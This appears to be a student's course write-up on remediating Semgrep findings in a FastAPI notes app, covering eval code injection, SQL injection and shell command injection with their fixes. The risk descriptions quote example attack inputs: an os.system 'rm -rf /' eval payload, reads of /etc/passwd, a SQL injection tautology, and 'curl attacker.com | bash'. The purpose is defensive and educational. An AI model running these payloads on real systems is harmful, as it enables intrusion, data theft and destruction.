# Week 6 Write-up
Tip: To preview this markdown file
- On Mac, press `Command (⌘) + Shift + V`
- On Windows/Linux, press `Ctrl + Shift + V`

## Instructions

Fill out all of the `TODO`s in this file.

## Submission Details

Name: **TODO** \
SUNet ID: **TODO** \
Citations: **TODO**

This assignment took me about **TODO** hours to do.


## Brief findings overview
> Semgrep identified 8 findings across 2 files (notes.py and action_items.py). After analysis, I identified 3 unique true-positive critical/high severity vulnerabilities requiring remediation:
> 1. **Code Injection** - `eval()` with untrusted user input allowing arbitrary Python code execution
> 2. **SQL Injection** - Raw SQL with f-string interpolation in the `unsafe_search` function
> 3. **Command Injection** - `subprocess.run` with `shell=True` and user-controlled input
>
> Note: SQL injection findings on `action_items.py:33` and `notes.py:33` were **false positives** - these lines use SQLAlchemy ORM's parameterized `offset()` and `limit()` methods which are safe.

## Fix #1
a. File and line(s)
> `backend/app/routers/notes.py`, lines 102-105 (original)

b. Rule/category Semgrep flagged
> `tainted-code-stdlib-fastapi` (Code Injection) - Critical Severity

c. Brief risk description
> The `debug_eval` endpoint used Python's `eval()` function directly on user input. An attacker could execute arbitrary Python code by passing malicious expressions like `__import__('os').system('rm -rf /')` or `open('/etc/passwd').read()`. This allows complete server compromise, data exfiltration, and remote code execution.

d. Your change (short code diff or explanation, AI coding tool usage)
> Replaced dangerous `eval()` with a safe AST-based mathematical expression evaluator:
> - Parse input using `ast.parse(expr, mode='eval')` to create an Abstract Syntax Tree
> - Implement `safe_eval()` that recursively evaluates only allowed operations
> - Define strict allowlist of operations: `Add`, `Sub`, `Mult`, `Div`, `Pow`, `USub`
> - Only allow numeric constants (`int`, `float`)
> - Reject any code constructs, function calls, imports, or attribute access
> - Return proper HTTP 400 errors for invalid expressions
>
> Used Gemini AI (Antigravity) to implement the fix following the design in SECURITY_FIX_PLAN.md.

e. Why this mitigates the issue
> By using AST parsing instead of `eval()`, we completely eliminate code execution. The parser only recognizes numeric literals and basic math operators. Any attempt to call functions, access attributes, or import modules results in a ValueError being raised and a 400 Bad Request response. The attack surface is reduced from "arbitrary Python code" to "basic arithmetic operations on numbers only."

## Fix #2
a. File and line(s)
> `backend/app/routers/notes.py`, lines 69-92 (original `unsafe_search` function)

b. Rule/category Semgrep flagged
> `generic-sql-fastapi`, `sqlalchemy-fastapi`, `fastapi-aiosqlite-sqli` (SQL Injection) - Critical Severity

c. Brief risk description
> The `unsafe_search` function constructed SQL queries using f-string interpolation with user input: `WHERE title LIKE '%{q}%'`. Attackers could inject SQL commands like `' OR '1'='1' --` to bypass filters, or use `UNION SELECT` to exfiltrate data from other tables. This could lead to data theft, modification, or deletion.

d. Your change (short code diff or explanation, AI coding tool usage)
> Replaced raw SQL with SQLAlchemy ORM query:
> ```python
> stmt = (
>     select(Note)
>     .where((Note.title.contains(q)) | (Note.content.contains(q)))
>     .order_by(desc(Note.created_at))
>     .limit(50)
> )
> rows = db.execute(stmt).scalars().all()
> ```
> - Renamed endpoint from `/unsafe-search` to `/search`
> - Moved route definition before `/{note_id}` to fix route ordering
>
> Used Gemini AI (Antigravity) to implement the fix following the design in SECURITY_FIX_PLAN.md.

e. Why this mitigates the issue
> SQLAlchemy ORM's `contains()` method automatically uses parameterized queries. The user input is bound as a parameter, not interpolated into the SQL string. The database driver escapes the input properly, making SQL injection impossible. Even if a user enters `' OR '1'='1`, it's treated as literal text to search for, not as SQL code.

## Fix #3
a. File and line(s)
> `backend/app/routers/notes.py`, lines 108-113 (original `debug_run` function)

b. Rule/category Semgrep flagged
> `tainted-os-command-stdlib-fastapi` (Command Injection) - High Severity

c. Brief risk description
> The `debug_run` endpoint executed arbitrary shell commands using `subprocess.run(cmd, shell=True)`. An attacker could run any system command like `cat /etc/passwd`, `curl attacker.com | bash`, or `rm -rf /`. This allows complete system compromise with the web server's privileges.

d. Your change (short code diff or explanation, AI coding tool usage)
> Implemented command allowlist approach with `shell=False`:
> ```python
> ALLOWED_COMMANDS = {
>     "uptime": ["uptime"],
>     "date": ["date"],
>     "hostname": ["hostname"],
>     "whoami": ["whoami"],
>     "pwd": ["pwd"],
> }
>
> if command not in ALLOWED_COMMANDS:
>     raise HTTPException(status_code=400, detail=f"Command not allowed...")
>
> completed = subprocess.run(ALLOWED_COMMANDS[command], capture_output=True, text=True, timeout=10)
> ```
> - Use `shell=False` (default) with command as list - prevents shell interpretation
> - Added 10-second timeout to prevent DoS via hanging commands
>
> Used Gemini AI (Antigravity) to implement the fix following the design in SECURITY_FIX_PLAN.md.

e. Why this mitigates the issue
> By using an allowlist, only predefined safe diagnostic commands can be executed. Users cannot inject custom commands. Setting `shell=False` and passing the command as a list prevents shell metacharacter interpretation (`;`, `|`, `&&`, etc.). The timeout protects against resource exhaustion. Attackers cannot execute arbitrary commands - only the 5 whitelisted commands are available.